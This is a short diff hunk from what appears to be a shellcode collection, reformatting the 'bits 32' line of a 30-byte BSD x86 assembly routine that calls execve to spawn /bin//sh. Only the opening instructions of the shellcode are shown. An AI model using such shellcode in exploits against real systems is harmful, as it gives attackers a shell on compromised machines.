@@ -31,7 +31,7 @@
 ; 30 byte execve("/bin//sh", {"/bin//sh", NULL}, 0) for bsd/x86
 ; odzhan
 
-    bits 32
+    bits    32
 
     push    0x3b
     pop     eax         ; eax = sys_execve
